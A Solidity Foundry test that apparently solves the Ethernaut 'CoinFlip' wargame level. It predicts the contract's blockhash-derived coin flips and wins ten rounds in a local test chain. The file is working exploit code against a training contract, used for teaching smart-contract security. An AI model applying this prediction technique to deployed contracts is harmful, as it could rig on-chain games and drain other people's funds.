// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";

import "../src/Ethernaut.sol";
import "ethernaut/contracts/levels/CoinFlipFactory.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract CoinFlipExploit is DSTest {
    using SafeMath for uint256;

    Vm private vm = Vm(address(HEVM_ADDRESS));
    Ethernaut private ethernaut;
    address private eoaAddress = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 1 ether);
    }

    function testExploit() public {
        // Setting up the level
        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
        ethernaut.registerLevel(coinFlipFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
        CoinFlip ethernautCoinFlip = CoinFlip(payable(levelAddress));

        // Exploit the contract
        // There is no true randomness on the Ethereum blockchain, thus using block.number or
        // block.timestamp in a contract to derive pseudo-randomness makes the contract vulnerable
        // Here, we compute the correct guess and we call the flip function once per block, 10 times
        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockNumber = block.number;
        for (uint i = 1; i <= 10; i++) {
            uint256 blockValue = uint256(blockhash(blockNumber + i - 2));
            uint256 coinFlip = blockValue.div(factor);
            ethernautCoinFlip.flip(coinFlip == 1);

            vm.roll(blockNumber + i);
        }

        // Submit the solution
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
